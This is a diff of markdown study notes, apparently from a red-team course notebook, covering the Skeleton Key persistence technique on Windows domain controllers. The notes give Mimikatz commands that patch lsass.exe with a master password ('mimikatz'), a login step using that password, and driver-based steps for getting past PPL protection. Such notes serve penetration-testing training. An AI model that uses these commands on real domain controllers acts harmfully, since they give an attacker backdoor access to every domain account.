@@ -2,7 +2,8 @@
 
 **Skeleton Key** is a Domain Controller (DC) post-exploitation persistence technique where the `lsass.exe` process is **patched in memory** to accept a **master password** for all us
 
->**Skeleton Key = A backdoor password ("mimikatz") injected into the Domain Controller's memory that works for ANY domain user, but disappears on reboot and is VERY loud.**
+> [!danger] Skeleton Key
+> **Skeleton Key = A backdoor password ("mimikatz") injected into the Domain Controller's memory that works for ANY domain user, but disappears on reboot and is VERY loud.**
 
 #### Example
 ```
@@ -14,27 +15,32 @@ Patched DC: Password can be EITHER:
 
 ___
 
-# Usage with Mimikatz (PowerShell Remoting)
+# <span style="color:#FF5555">Usage with Mimikatz (PowerShell Remoting)</span>
+
+> [!info] Variables used below
+> - `$DC_IP` – Domain Controller's IP
+> - `$DOMAIN` – target domain name
 
 To inject the Skeleton Key into `lsass.exe` on a Domain Controller:
 
 ```powershell
 # Inject skeleton key into DC
 
-Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName $DC_IP
 ```
 
 **Any username + password "mimikatz" works:**
 
 ```powershell
 # Connect to DC using ANY account with the skeleton password
-Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator
+Enter-PSSession -ComputerName $DC_IP -Credential $DOMAIN\Administrator
 # Password: mimikatz
 ```
 
 ___
-# If `lsass.exe` is a Protected Process (PPL)
+# <span style="color:#FF5555">If `lsass.exe` is a Protected Process (PPL)</span>
 
+> [!info] PPL (Protected Process Light)
 > PPL is a **Windows security feature** that protects important system processes (like **LSASS**) from being accessed or modified by normal programs.
 
 In some environments, `lsass` runs with Protected Process Light (PPL). You can still inject Skeleton Key using the Mimikatz driver:
@@ -51,4 +57,4 @@ mimikatz # misc::skeleton
 mimikatz # !-
 ```
 
-This involves **kernel-mode driver loading** (`mimidriv.sys`) and is very **noisy**—triggers EDR alerts and logging.
+This involves **kernel-mode driver loading** (`mimidriv.sys`) and is very ==noisy==—triggers EDR alerts and logging.
